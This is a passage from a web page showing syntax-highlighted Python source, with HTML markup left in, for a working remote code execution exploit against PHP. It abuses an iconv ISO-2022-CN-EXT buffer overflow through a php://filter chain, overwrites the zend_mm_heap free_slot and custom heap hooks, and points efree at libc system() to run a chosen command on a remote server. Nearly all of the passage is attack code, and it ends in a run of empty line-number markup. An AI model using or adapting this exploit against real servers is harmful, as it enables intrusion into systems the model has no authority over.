0x7fffAABBCCB00 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCC900        We need to go the other way around. That's why we have step 1: it just allocates        chunks. When they get freed, they reverse the free list. Now step2 allocates in        reverse order, and therefore after step2, chunks are in the correct order.        Another problem comes up.        To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.        Since step2 creates chunks that contain pointers and pointers are generally not        UTF-8, we cannot afford to have that conversion happen on the chunks of step2.        To avoid this, we put the chunks in step2 at the very end of the chain, and        prefix them with `0\n`. When dechunked (right before the iconv), they will        "disappear" from the chain, preserving them from the character set conversion        and saving us from an unwanted processing error that would stop the processing        chain.        After step3 we have a corrupted freelist with an arbitrary pointer into it. We        don't know the precise layout of the heap, but we know that at the top of the        heap resides a zend_mm_heap structure. We overwrite this structure in two ways.        Its free_slot[] array contains a pointer to each free list. By overwriting it,        we can make PHP allocate chunks whereever we want. In addition, its custom_heap        field contains pointers to hook functions for emalloc, efree, and erealloc        (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and        then overwrite the use_custom_heap flag to make PHP use these function pointers        instead. We can now do our favorite CTF technique and get a call to        system(&lt;chunk&gt;).        We make sure that the "system" command kills the current process to avoid other        system() calls with random chunk data, leading to undefined behaviour.        The pad blocks just "pad" our allocations so that even if the heap of the        process is in a random state, we still get contiguous, in order chunks for our        exploit.        Therefore, the whole process described here CANNOT crash. Everything falls        perfectly in place, and nothing can get in the middle of our allocations.        """</span>        LIBC <span class="token operator">=</span> self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"libc"</span><span class="token punctuation">]</span>        ADDR_EMALLOC <span class="token operator">=</span> LIBC<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__libc_malloc"</span><span class="token punctuation">]</span>        ADDR_EFREE <span class="token operator">=</span> LIBC<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__libc_system"</span><span class="token punctuation">]</span>        ADDR_EREALLOC <span class="token operator">=</span> LIBC<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__libc_realloc"</span><span class="token punctuation">]</span>        ADDR_HEAP <span class="token operator">=</span> self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"heap"</span><span class="token punctuation">]</span>        ADDR_FREE_SLOT <span class="token operator">=</span> ADDR_HEAP <span class="token operator">+</span> <span class="token number">0x20</span>        ADDR_CUSTOM_HEAP <span class="token operator">=</span> ADDR_HEAP <span class="token operator">+</span> <span class="token number">0x0168</span>        ADDR_FAKE_BIN <span class="token operator">=</span> ADDR_FREE_SLOT <span class="token operator">-</span> <span class="token number">0x10</span>        CS <span class="token operator">=</span> <span class="token number">0x100</span>        <span class="token comment"># Pad needs to stay at size 0x100 at every step</span>        pad_size <span class="token operator">=</span> CS <span class="token operator">-</span> <span class="token number">0x18</span>        pad <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> pad_size        pad <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>pad<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pad<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span>        pad <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>pad<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pad<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span>        pad <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>pad<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pad<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span>        pad <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>pad<span class="token punctuation">)</span>        step1_size <span class="token operator">=</span> <span class="token number">1</span>        step1 <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> step1_size        step1 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step1<span class="token punctuation">)</span>        step1 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step1<span class="token punctuation">)</span>        step1 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step1<span class="token punctuation">,</span> CS<span class="token punctuation">)</span>        step1 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step1<span class="token punctuation">)</span>        <span class="token comment"># Since these chunks contain non-UTF-8 chars, we cannot let it get converted to</span>        <span class="token comment"># ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk "crash"</span>        step2_size <span class="token operator">=</span> <span class="token number">0x48</span>        step2 <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>step2_size <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span>        step2 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2<span class="token punctuation">,</span> CS<span class="token punctuation">)</span>        step2 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2<span class="token punctuation">)</span>        step2 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step2<span class="token punctuation">)</span>        step2_write_ptr <span class="token operator">=</span> <span class="token string">b"0\n"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>step2_size<span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ADDR_FAKE_BIN<span class="token punctuation">)</span>        step2_write_ptr <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2_write_ptr<span class="token punctuation">,</span> CS<span class="token punctuation">)</span>        step2_write_ptr <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2_write_ptr<span class="token punctuation">)</span>        step2_write_ptr <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step2_write_ptr<span class="token punctuation">)</span>        step3_size <span class="token operator">=</span> CS        step3 <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> step3_size        <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>step3<span class="token punctuation">)</span> <span class="token operator">==</span> CS        step3 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>        step3 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>        step3 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>        step3 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>        step3_overflow <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>step3_size <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>BUG<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> BUG        <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span> <span class="token operator">==</span> CS        step3_overflow <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>        step3_overflow <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>        step3_overflow <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>        step3_overflow <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>        step4_size <span class="token operator">=</span> CS        step4 <span class="token operator">=</span> <span class="token string">b"=00"</span> <span class="token operator">+</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>step4_size <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>        step4 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>        step4 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>        step4 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>        step4 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>        <span class="token comment"># This chunk will eventually overwrite mm_heap-&gt;free_slot</span>        <span class="token comment"># it is actually allocated 0x10 bytes BEFORE it, thus the two filler values</span>        step4_pwn <span class="token operator">=</span> ptr_bucket<span class="token punctuation">(</span>            <span class="token number">0x200000</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token comment"># free_slot</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            ADDR_CUSTOM_HEAP<span class="token punctuation">,</span>  <span class="token comment"># 0x18</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            ADDR_HEAP<span class="token punctuation">,</span>  <span class="token comment"># 0x140</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            size<span class="token operator">=</span>CS<span class="token punctuation">,</span>        <span class="token punctuation">)</span>        step4_custom_heap <span class="token operator">=</span> ptr_bucket<span class="token punctuation">(</span>            ADDR_EMALLOC<span class="token punctuation">,</span> ADDR_EFREE<span class="token punctuation">,</span> ADDR_EREALLOC<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x18</span>        <span class="token punctuation">)</span>        step4_use_custom_heap_size <span class="token operator">=</span> <span class="token number">0x140</span>        COMMAND <span class="token operator">=</span> self<span class="token punctuation">.</span>command        COMMAND <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>COMMAND<span class="token punctuation">}</span></span><span class="token string">"</span></span>        <span class="token keyword">print</span><span class="token punctuation">(</span>COMMAND<span class="token punctuation">)</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>sleep<span class="token punctuation">:</span>            COMMAND <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"sleep </span><span class="token interpolation"><span class="token punctuation">{</span>self<span class="token punctuation">.</span>sleep<span class="token punctuation">}</span></span><span class="token string">; </span><span class="token interpolation"><span class="token punctuation">{</span>COMMAND<span class="token punctuation">}</span></span><span class="token string">"</span></span>        COMMAND <span class="token operator">=</span> COMMAND<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"\x00"</span>        <span class="token keyword">assert</span> <span class="token punctuation">(</span>                <span class="token builtin">len</span><span class="token punctuation">(</span>COMMAND<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> step4_use_custom_heap_size        <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"Command too big (</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">len</span><span class="token punctuation">(</span>COMMAND<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">), it must be strictly inferior to </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">hex</span><span class="token punctuation">(</span>step4_use_custom_heap_size<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span>        COMMAND <span class="token operator">=</span> COMMAND<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>step4_use_custom_heap_size<span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> COMMAND        step4_use_custom_heap <span class="token operator">=</span> qpe<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        pages <span class="token operator">=</span> <span class="token punctuation">(</span>                step4 <span class="token operator">*</span> <span class="token number">3</span>                <span class="token operator">+</span> step4_pwn                <span class="token operator">+</span> step4_custom_heap                <span class="token operator">+</span> step4_use_custom_heap                <span class="token operator">+</span> step3_overflow                <span class="token operator">+</span> pad <span class="token operator">*</span> self<span class="token punctuation">.</span>pad                <span class="token operator">+</span> step1 <span class="token operator">*</span> <span class="token number">3</span>                <span class="token operator">+</span> step2_write_ptr                <span class="token operator">+</span> step2 <span class="token operator">*</span> <span class="token number">2</span>        <span class="token punctuation">)</span>        resource <span class="token operator">=</span> compress<span class="token punctuation">(</span>compress<span class="token punctuation">(</span>pages<span class="token punctuation">)</span><span class="token punctuation">)</span>        resource <span class="token operator">=</span> b64<span class="token punctuation">(</span>resource<span class="token punctuation">)</span>        resource <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">{</span>resource<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span>        filters <span class="token operator">=</span> <span class="token punctuation">[</span>            <span class="token comment"># Create buckets</span>            <span class="token string">"zlib.inflate"</span><span class="token punctuation">,</span>            <span class="token string">"zlib.inflate"</span><span class="token punctuation">,</span>            <span class="token comment"># Step 0: Setup heap</span>            <span class="token string">"dechunk"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.L1.L1"</span><span class="token punctuation">,</span>            <span class="token comment"># Step 1: Reverse FL order</span>            <span class="token string">"dechunk"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.L1.L1"</span><span class="token punctuation">,</span>            <span class="token comment"># Step 2: Put fake pointer and make FL order back to normal</span>            <span class="token string">"dechunk"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.L1.L1"</span><span class="token punctuation">,</span>            <span class="token comment"># Step 3: Trigger overflow</span>            <span class="token string">"dechunk"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.UTF-8.ISO-2022-CN-EXT"</span><span class="token punctuation">,</span>            <span class="token comment"># Step 4: Allocate at arbitrary address and change zend_mm_heap</span>            <span class="token string">"convert.quoted-printable-decode"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.L1.L1"</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span>        filters <span class="token operator">=</span> <span class="token string">"|"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>filters<span class="token punctuation">)</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter/read=</span><span class="token interpolation"><span class="token punctuation">{</span>filters<span class="token punctuation">}</span></span><span class="token string">/resource=</span><span class="token interpolation"><span class="token punctuation">{</span>resource<span class="token punctuation">}</span></span><span class="token string">"</span></span>        <span class="token keyword">return</span> path    <span class="token decorator annotation punctuation">@inform</span><span class="token punctuation">(</span><span class="token string">"Triggering..."</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        path <span class="token operator">=</span> self<span class="token punctuation">.</span>build_exploit_path<span class="token punctuation">(</span><span class="token punctuation">)</span>        start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>send<span class="token punctuation">(</span>path<span class="token punctuation">)</span>        <span class="token keyword">except</span> <span class="token punctuation">(</span>ConnectionError<span class="token punctuation">,</span> ChunkedEncodingError<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>        msg_print<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>sleep<span class="token punctuation">:</span>            msg_print<span class="token punctuation">(</span><span class="token string">"    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]"</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> start <span class="token operator">+</span> self<span class="token punctuation">.</span>sleep <span class="token operator">&lt;=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            msg_print<span class="token punctuation">(</span><span class="token string">"    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]"</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token comment"># Wrong heap, maybe? If the exploited suggested others, use them!</span>            msg_print<span class="token punctuation">(</span><span class="token string">"    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]"</span><span class="token punctuation">)</span>        msg_print<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">compress</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Returns data suitable for `zlib.inflate`.    """</span>    <span class="token comment"># Remove 2-byte header and 4-byte checksum</span>    <span class="token keyword">return</span> zlib<span class="token punctuation">.</span>compress<span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">b64</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> base64<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> misalign <span class="token keyword">and</span> payload<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Misaligned: </span><span class="token interpolation"><span class="token punctuation">{</span>data<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">return</span> payload<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">compressed_bucket</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Returns a chunk of size 0x8000 that, when dechunked, returns the data."""</span>    <span class="token keyword">return</span> chunked_chunk<span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">0x8000</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">qpe</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Emulates quoted-printable-encode.    """</span>    <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"=</span><span class="token interpolation"><span class="token punctuation">{</span>x<span class="token punctuation">:</span><span class="token format-spec">02x</span><span class="token punctuation">}</span></span><span class="token string">"</span></span> <span class="token keyword">for</span> x <span class="token keyword">in</span> data<span class="token punctuation">)</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ptr_bucket</span><span class="token punctuation">(</span><span class="token operator">*</span>ptrs<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Creates a 0x8000 chunk that reveals pointers after every step has been ran."""</span>    <span class="token keyword">if</span> size <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>ptrs<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">==</span> size    bucket <span class="token operator">=</span> <span class="token string">b""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span>p64<span class="token punctuation">,</span> ptrs<span class="token punctuation">)</span><span class="token punctuation">)</span>    bucket <span class="token operator">=</span> qpe<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    bucket <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    bucket <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    bucket <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    bucket <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    <span class="token keyword">return</span> bucket<span class="token keyword">def</span> <span class="token function">chunked_chunk</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> size<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Constructs a chunked representation of the given chunk. If size is given, the    chunked representation has size `size`.    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.    """</span>    <span class="token comment"># The caller does not care about the size: let's just add 8, which is more than</span>    <span class="token comment"># enough</span>    <span class="token keyword">if</span> size <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span>    keep <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token string">b"\n\n"</span><span class="token punctuation">)</span>    size <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token format-spec">x</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>size <span class="token operator">-</span> keep<span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> size<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"\n"</span> <span class="token operator">+</span> data <span class="token operator">+</span> <span class="token string">b"\n"</span><span class="token decorator annotation punctuation">@dataclass</span><span class="token keyword">class</span> <span class="token class-name">Region</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""A memory region."""</span>    start<span class="token punctuation">:</span> <span class="token builtin">int</span>    stop<span class="token punctuation">:</span> <span class="token builtin">int</span>    permissions<span class="token punctuation">:</span> <span class="token builtin">str</span>    path<span class="token punctuation">:</span> <span class="token builtin">str</span>    <span class="token decorator annotation punctuation">@property</span>    <span class="token keyword">def</span> <span class="token function">size</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">int</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>stop <span class="token operator">-</span> self<span class="token punctuation">.</span>startExploit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><sp